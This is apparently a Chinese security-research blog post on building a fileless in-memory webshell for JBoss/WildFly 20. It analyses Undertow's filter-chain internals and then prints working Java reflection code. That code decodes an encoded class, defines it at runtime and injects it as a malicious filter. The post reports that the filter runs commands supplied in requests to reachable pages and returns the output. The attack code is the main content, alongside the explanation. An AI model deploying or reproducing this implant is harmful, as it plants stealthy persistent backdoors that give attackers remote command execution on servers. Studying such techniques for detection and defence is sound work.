**作者：宽字节安全**  
**原文链接：**  
**本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！**  
**投稿邮箱：PI:EMAIL**
前几篇文章主要研究了tomcat，weblogic的无文件webshell。这篇文章则重点研究jboss的无文件webhsell。下面分享一下思路,以下分析基于
jboss 社区版 wildfly-20.0.0.Final版本。
## 0x01 wildfly 加载Filter分析
在Filter处随便打一个断点，如图，观察堆栈
jboss比较简单，处理Filter的代码如下所示
    io.undertow.servlet.handlers.FilterHandler#handleRequest
    public void handleRequest(HttpServerExchange exchange) throws Exception {
        ServletRequestContext servletRequestContext = (ServletRequestContext)exchange.getAttachment(ServletRequestContext.ATTACHMENT_KEY);
        ServletRequest request = servletRequestContext.getServletRequest();
        ServletResponse response = servletRequestContext.getServletResponse();
        DispatcherType dispatcher = servletRequestContext.getDispatcherType();
        Boolean supported = (Boolean)this.asyncSupported.get(dispatcher);
        if (supported != null && !supported) {
            servletRequestContext.setAsyncSupported(false);
        }
        List filters = (List)this.filters.get(dispatcher);
        if (filters == null) {
            this.next.handleRequest(exchange);
        } else {
            FilterHandler.FilterChainImpl filterChain = new FilterHandler.FilterChainImpl(exchange, filters, this.next, this.allowNonStandardWrappers);
            filterChain.doFilter(request, response);
        }
    }
FilterHandler的handleRequest方法中，获取filter去创建filter。并创建FilterChainImpl。我们继续向上分析哪些函数调用了hadleRequest。在`io.undertow.servlet.handlers.ServletChain#ServletChain`方法中，会执行forceInit方法，forceInit方法的代码如下
    io.undertow.servlet.handlers.ServletChain#forceInit
                List list = filters.get(dispatcherType);
                if(list != null && !list.isEmpty()) {
                    for(int i = 0; i  filterClass) {
            try {
                final Constructor ctor = (Constructor) filterClass.getDeclaredConstructor();
                ctor.setAccessible(true);
                this.instanceFactory = new ConstructorInstanceFactory<>(ctor);
                this.name = name;
                this.filterClass = filterClass;
            } catch (NoSuchMethodException e) {
                throw UndertowServletMessages.MESSAGES.componentMustHaveDefaultConstructor("Filter", filterClass);
            }
        }
#### 3.2 servletContext
servletContext与Context不是一个类型。但是可以从Context中获取servletContext对象。
完整代码如下
        Method currentM = Class.forName("io.undertow.servlet.handlers.ServletRequestContext").getDeclaredMethod("current");
        Object curContext = currentM.invoke(null);
        Method getCurrentServletM = curContext.getClass().getMethod("getCurrentServlet");
        Object servletChain = getCurrentServletM.invoke(curContext);
        Field filtersF = servletChain.getClass().getDeclaredField("filters");
        filtersF.setAccessible(true);
        java.util.EnumMap filters = (EnumMap) filtersF.get(servletChain);
        String evilFilterClassName = "testFilter1";
        Class evilFilterClass = null;
        try {
            evilFilterClass = Class.forName(evilFilterClassName);
        } catch (ClassNotFoundException e) {
            BASE64Decoder b64Decoder = new sun.misc.BASE64Decoder();
            String codeClass = "H4sIAAAAAAAA...";
            Method defineClassM = Thread.currentThread().getContextClassLoader().getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClassM.setAccessible(true);
            evilFilterClass = (Class) defineClassM.invoke(Thread.currentThread().getContextClassLoader(), uncompress(b64Decoder.decodeBuffer(codeClass)), 0, uncompress(b64Decoder.decodeBuffer(codeClass)).length);
        }
        ArrayList filterList = (ArrayList) filters.get(DispatcherType.REQUEST);
        Object evilFilterInfo = Class.forName("io.undertow.servlet.api.FilterInfo").getDeclaredConstructors()[0].newInstance("UnicodeSec", evilFilterClass);
        Field servletRequestF = curContext.getClass().getDeclaredField("servletRequest");
        servletRequestF.setAccessible(true);
        Object obj = servletRequestF.get(curContext);
        Field servletContextF = obj.getClass().getDeclaredField("servletContext");
        servletContextF.setAccessible(true);
        Object servletContext = servletContextF.get(obj);
        Object evilManagedFilter = Class.forName("io.undertow.servlet.core.ManagedFilter").getDeclaredConstructors()[0].newInstance(evilFilterInfo, servletContext);
        filterList.add(evilManagedFilter);
## 0x03 成果检验
jboss有些特殊，上面的内存马只能在可以被正常访问的页面中才可以触发内存马。效果如下
添加需要执行的命令，内存马开始执行命令，并输入结果
正常访问页面，则无反应
* * *